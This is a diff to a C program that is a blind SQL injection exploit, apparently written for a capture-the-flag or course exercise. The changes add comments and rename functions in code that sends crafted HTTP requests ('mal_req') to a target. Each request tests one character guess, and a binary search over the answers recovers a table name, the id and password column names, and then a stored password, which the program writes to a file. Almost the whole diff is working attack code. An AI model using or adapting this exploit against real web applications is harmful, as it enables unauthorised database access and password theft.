@@ -158,6 +158,9 @@ void _send(const int32_t client, const void * const data, size_t size) {
     }
 }
 
+/**
+ * Receives a page chunk by chunk and checks whether the SQL query has been successful.
+ */
 bool recv_empty(int32_t sockfd) {
     enum {
         CHUNK = 16
@@ -199,32 +202,41 @@ bool recv_empty(int32_t sockfd) {
     return ptr;
 }
 
-typedef bool (*check_func_t)(const void *ctx);
+// Comparator function signature for the binary search.
+typedef bool (*compare_func_t)(const void *ctx);
 
+// Base structure for the binary search.
 typedef struct {
     int sockfd;
-    char *discovered;
-    char *discovered_like;
-    char *discovered_identifier;
-    int index;
-    const char *guess;
-} GeneralCtx;
+    char *discovered; // The discovered expression, whether it is a table name, column name, or password.
+    char *discovered_like; // The same, but for use with the LIKE operator.
+    char *discovered_identifier; // The same, but for use as an identifier.
+    int index; // The current character index in which the binary search is performed.
+    const char *guess; // The current character guess.
+} BinarySearchCtx;
 
+// Structure for the columns names binary search.
 typedef struct {
-    GeneralCtx gen_ctx;
-    const char *col_to_find;
-    const char *table_name;
+    BinarySearchCtx gen_ctx;
+    const char *column_type; // The column type, either id or pwd.
+    const char *table_name; // The name of the previously discovered table.
 } ColumnCtx;
 
+// Structure for the password binary search.
 typedef struct {
-    GeneralCtx gen_ctx;
-    const char *table_name;
-    const char *id_col;
-    const char *pwd_col;
+    BinarySearchCtx gen_ctx;
+    const char *table_name; // The name of the previously discovered table.
+    const char *id_col; // The name of the previously discovered id column.
+    const char *pwd_col; // The name of the previously discovered pwd column.
 } PwdCtx;
 
-bool check_table(const void *ctx) {
-    GeneralCtx *table_ctx = (GeneralCtx *)ctx;
+// Comparator functions
+// All comparator functions format and perform the requests, and
+// return true on query success.
+
+// Comparator function for the table binary search.
+bool table_compare(const void *ctx) {
+    BinarySearchCtx *table_ctx = (BinarySearchCtx *)ctx;
 
     char mal_req[4096];
 
@@ -246,7 +258,8 @@ bool check_table(const void *ctx) {
     return recv_empty(table_ctx->sockfd);
 }
 
-bool check_column(const void *ctx) {
+// Comparator function for the column binary search.
+bool column_compare(const void *ctx) {
     ColumnCtx *c_ctx = (ColumnCtx*)ctx;
     char mal_req[4096];
 
@@ -264,12 +277,13 @@ bool check_column(const void *ctx) {
         "Connection: Keep-Alive\r\n"
         "\r\n";
 
-    sprintf(mal_req, fmt, c_ctx->table_name, c_ctx->col_to_find, c_ctx->gen_ctx.discovered_like, c_ctx->gen_ctx.index,
+    sprintf(mal_req, fmt, c_ctx->table_name, c_ctx->column_type, c_ctx->gen_ctx.discovered_like, c_ctx->gen_ctx.index,
         c_ctx->gen_ctx.index + 1, c_ctx->gen_ctx.guess);
     _send(c_ctx->gen_ctx.sockfd, mal_req, strlen(mal_req));
     return recv_empty(c_ctx->gen_ctx.sockfd);
 }
 
+// Comparator function for the password binary search.
 bool check_password(const void *ctx) {
     PwdCtx *d_ctx = (PwdCtx*)ctx;
     char mal_req[4096];
@@ -311,6 +325,7 @@ bool check_password(const void *ctx) {
     return recv_empty(d_ctx->gen_ctx.sockfd);
 }
 
+// Maps (ASCII - 0x20) to the proper escape sequence for use with the LIKE operator.
 const char *url_map_like[96] = {
     "%20", // 0x20 Space
     "%21", // 0x21 !
@@ -365,6 +380,8 @@ const char *url_map_like[96] = {
     "%7F"  // 0x7F DEL
 };
 
+// Maps (ASCII - 0x20) to the proper escape sequence for use with
+// an identifier (basically as a variable) within a standard context.
 const char *url_map_identifier[96] = {
     "%20", // 0x20 Space
     "%21", // 0x21 !
@@ -419,6 +436,7 @@ const char *url_map_identifier[96] = {
     "%7F"  // 0x7F DEL
 };
 
+// Maps (ASCII - 0x20) to the proper escape sequence for use within single quotes.
 const char *url_map_single_quote[96] = {
     "%20", // 0x20 Space
     "%21", // 0x21 !
@@ -473,8 +491,10 @@ const char *url_map_single_quote[96] = {
     "%7F"  // 0x7F DEL
 };
 
-void binary_search(check_func_t check_fn, void *ctx) {
-    GeneralCtx *gen_ctx = (GeneralCtx *)ctx;
+// Performs a binary search, with compare_fn as the comparison function,
+// and ctx as the context passed to it upon comparison.
+void binary_search(compare_func_t compare_fn, void *ctx) {
+    BinarySearchCtx *gen_ctx = (BinarySearchCtx *)ctx;
 #ifdef __MY_DEBUG__
     int count = 0;
 #endif
@@ -493,7 +513,7 @@ void binary_search(check_func_t check_fn, void *ctx) {
         #endif
             gen_ctx->index = i;
             gen_ctx->guess = url_map_single_quote[mid];
-            if (check_fn(ctx)) {
+            if (compare_fn(ctx)) {
                 high=mid;
             } else {
                 low=mid + 1;
@@ -517,6 +537,7 @@ void binary_search(check_func_t check_fn, void *ctx) {
 #endif
 }
 
+// Writes the password to a file as required.
 void write_to_file(const char *const filename, const char *const s) {
     FILE *file_ptr = fopen(filename, "w");
     fprintf(file_ptr, "*%s*", s);
@@ -531,14 +552,14 @@ int32_t main() {
     char table_name_ident[31] = {0};
     char table_name_like[61] = {0};
     {
-        GeneralCtx table_ctx = {
+        BinarySearchCtx table_ctx = {
             .sockfd = sockfd,
             .discovered = table_name,
             .discovered_identifier = table_name_ident,
             .discovered_like = table_name_like
         };
 
-        binary_search(check_table, &table_ctx);
+        binary_search(table_compare, &table_ctx);
     }
 
     #ifdef __MY_DEBUG__
@@ -557,10 +578,10 @@ int32_t main() {
                 .discovered_like = id_name_like
             },
             .table_name = table_name_ident,
-            .col_to_find = "id"
+            .column_type = "id"
         };
 
-        binary_search(check_column, &id_ctx);
+        binary_search(column_compare, &id_ctx);
     }
 
     char pwd_name[11] = {0};
@@ -575,10 +596,10 @@ int32_t main() {
                 .discovered_like = pwd_name_like
             },
             .table_name = table_name_like,
-            .col_to_find = "pwd"
+            .column_type = "pwd"
         };
 
-        binary_search(check_column, &pwd_col_ctx);
+        binary_search(column_compare, &pwd_col_ctx);
     }
 
     char final_password[11] = {0};
